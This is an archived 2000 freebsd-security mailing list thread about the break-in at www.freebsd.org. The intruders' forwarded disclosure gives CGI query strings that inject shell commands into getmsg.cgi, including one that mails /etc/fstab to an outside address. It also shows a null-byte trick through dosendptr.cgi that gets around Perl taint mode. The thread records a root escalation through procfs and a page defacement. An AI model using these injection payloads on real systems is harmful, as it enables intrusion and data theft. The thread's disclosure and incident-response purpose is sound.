@@ -1,0 +1,217 @@
+----- Forwarded message from Frank van Vliet <karin@root66.org> -----
+
+Delivered-To: karin-root66-karin@root66.org
+Date: Tue, 28 Nov 2000 02:46:03 +0000
+Reply-To: root66@thyserpent.net (root66 Mailinglist)
+Errors-To: root66
+Precedence: bulk
+X-Courtesy-Of: root66 MailingList
+From: Frank van Vliet <karin@root66.org>
+To: security-officer@freebsd.org
+Cc: Joost Pol <nohican@niets.org>
+Subject: Security of FreeBSD.org
+User-Agent: Mutt/1.2.5i
+
+Dear SecurityPeople,
+
+As you might have noticed, Frank and I (Nohican) have discovered
+some minor security issues on freebsd.org
+
+We noticed that in the cgi-script dosendptr.cgi the gndb paramter
+was not correctly checked, so we could 'require' any file we wished
+by carefully constructring a query string.
+
+This was not much of an issue until we discoverd the getmsg.cgi script
+that didn't do correct input validation on the fetch parameter, which
+was passed to an open call.
+
+The vulnerabillity in the getmsg.cgi was the most severe, this would 
+allow us to pass strings like ';/usr/bin/id|' and have it openend,
+but two issues came to mind:
+
+1. The input was splitted on spaces.
+2. The getmsg.cgi was using perl in tainted mode.
+
+The first limitation was easy to overcome, we just used tabs instead of 
+spaces to seperate commands. so querystrings like this worked:
+ 
+getmsg.cgi?fetch=one+two+;/bin/cat%09/etc/ftsab%09|mail%09nohican\@niets.org|+four 
+
+still this all failed, because getmsg.cgi was using perl in tainted mode.
+
+We could overcome the tainted perl by requiring the getmsg.cgi using
+the dosendptr.cgi script
+
+So, using query strings like this:
+
+http://www.freebsd.org/dosendptr.cgi?gngdb=./getmsg.cgi%00&
+fetch=one+two+/usr/local/www/db/text;/bin/cat%09/etc/fstab|+four
+
+Could be executed.
+
+We gained nobody access to the freebsd.org boxen and quickly 
+leveraged our access to root using a know issue regarding
+/proc/pid/mem files. We also discovered this hole and reported
+it some time back.
+
+Please understand, we have no "bad' intentions, and we have not
+made any attemepts to conceal our "findings" by sanatizing logs
+or something.
+
+The only thing we did was add one extra rule on hup.freebsd.org for url rewriting and editing its local index.html. http://freeb
+sd.org/index.html now got a tiny message of us to kris, backups are made in the same dir as origional files.
+
+Kris, good luck on your new job, if we can be of any help, 
+please let us know.
+
+Kind regards,
+Joost Pol aka Nohican
+Frank Van Vliet aka {}
+
+
+
+----- End forwarded message -----
+
+As promised, here are the details of the recent penetration of the
+www.freebsd.org server.
+
+As several people guessed, the initial penetration involved weaknesses
+in the CGI scripts running on the website. This gained control of user
+nobody, and then a local root vulnerability was leveraged to gain root
+access to the machine.
+
+As far as we could tell, the attackers' only action was to plant a
+greeting on the main webpage. They contacted the security-officer
+immediately describing the entry mechanism and the extent of their
+activities, and while we do not believe any further malicious activity
+was carried out, various protective measures were taken to sanitize
+the compromised system, including an audit for all known security
+holes and a complete system upgrade.
+
+The www cgi scripts have since been audited by several people for
+other vulnerabilities, four of which were found and corrected (I don't
+have the exact details to hand). All involved input validation errors
+which allowed a remote user to execute commands as the user running
+the cgi scripts (user nobody). There is still further work which is
+being done on the cgi scripts to ensure greater safety (e.g. use of
+perl's taint mode), but the auditors believe the problems have been
+fixed. There are also other changes planned to improve the security of
+machines in the freebsd.org cluster against future penetration
+attempts.
+
+It's my understanding that none of the www.freebsd.org mirrors use the
+CGI scripts, therefore this vulnerability is likely limited to the one
+main server - but if anyone else has adapted freebsd CGI scripts for
+their own purposes they are advised to catch up with recent
+changes. Since the website contents are not a supported FreeBSD
+product an advisory is not planned for these vulnerabilities.
+
+Sorry for taking longer than promised to send this mail. I am
+currently suffering under very reduced connectivity while back home in
+Australia for the holidays. Thanks for everyone's patience.
+
+Kris Kennaway
+FreeBSD Security Officer
+
+
+On Thu, 14 Dec 2000, Kris Kennaway wrote:
+
+> As promised, here are the details of the recent penetration of the
+> www.freebsd.org server.
+> 
+> As several people guessed, the initial penetration involved weaknesses
+> in the CGI scripts running on the website. This gained control of user
+> nobody, and then a local root vulnerability was leveraged to gain root
+> access to the machine.
+> [stuff deleted] 
+> The www cgi scripts have since been audited by several people for
+> other vulnerabilities, four of which were found and corrected (I don't
+
+This brings up an excellent point.  It would be great if I could
+out-source the responsibility of reviewing [and optionally correcting] C
+or Perl code prior to making it available to webserver customers.
+
+Is there a centralized source of {reputable, qualified} individuals that
+provide this service?
+
+
+
+To Unsubscribe: send mail to majordomo@FreeBSD.org
+with "unsubscribe freebsd-security" in the body of the message
+
+
+Kris,
+
+Any chance you could let us know exactly what 'local root vulnerability' was
+exploited. As I recall it was originally stated that no weakness in FreeBSD
+itself had been leveraged. I appreciate that the hacker gained access to the
+system via CGI (and not a FreeBSD weakness) but once in he/she became root
+through some other means. Was this vulnerability a configuration issue or
+simply a known problem that had not been addressed?
+
+Thanks, john...
+
+
+
+
+
+To Unsubscribe: send mail to majordomo@FreeBSD.org
+with "unsubscribe freebsd-security" in the body of the message
+
+On Fri, Dec 15, 2000 at 07:53:32AM -0000, John Howie wrote:
+> Any chance you could let us know exactly what 'local root vulnerability' was
+> exploited. As I recall it was originally stated that no weakness in FreeBSD
+> itself had been leveraged. I appreciate that the hacker gained access to the
+> system via CGI (and not a FreeBSD weakness) but once in he/she became root
+> through some other means. Was this vulnerability a configuration issue or
+> simply a known problem that had not been addressed?
+
+Allthou we normaly only use weaknesses created by the server admins itself, 
+like cgi scripts made by them and configurations, this time local root was
+gained by a local root exploit which was an 'error' of freebsd itself. 
+Advisory about it was promised to be send weeks ago, it is fixed in FreeBSD 4.2
+
+Kris, this would be a nice timing for that advisory?
+
+        Frank van Vliet alias {}
+        Joost Pol alias nohican
+
+        
+-- 
+RooT66:         http://root66.student.utwente.nl
+PGP Public Key: http://root66.student.utwente.nl/frank.pub.pgp
+
+
+On Fri, Dec 15, 2000 at 07:53:32AM -0000, John Howie wrote:
+> Kris,
+> 
+> Any chance you could let us know exactly what 'local root vulnerability' was
+> exploited. As I recall it was originally stated that no weakness in FreeBSD
+> itself had been leveraged. I appreciate that the hacker gained access to the
+
+No, I said that it was not a vulnerability in FreeBSD which allowed
+the initial penetration. The attackers wouldn't have been able to get
+in if this was any old FreeBSD system that wasn't running dodgy CGI
+scripts.
+
+> system via CGI (and not a FreeBSD weakness) but once in he/she became root
+> through some other means. Was this vulnerability a configuration issue or
+> simply a known problem that had not been addressed?
+
+The latter :-( In fact it was a problem which was brought to our
+attention a few days prior by the same guys who did the penetration -
+unfortunately it's taken us rather longer than I would have liked to
+get it fixed and an advisory released, a combination of the people
+involved being busy travelling, or just busy. However we've finally
+got it all together, it seems, and so an advisory should be out on
+Monday.
+
+If I'd known how long it would take to get the problem fixed I would
+have released details informally before now - I can only apologise for
+the delay, although to my knowledge this vulnerability is not yet
+widely known - basically there are several local root exploits in
+procfs: wait for the advisory for more details, unmount procfs now on
+your multi-user systems.
+
+Kris
+
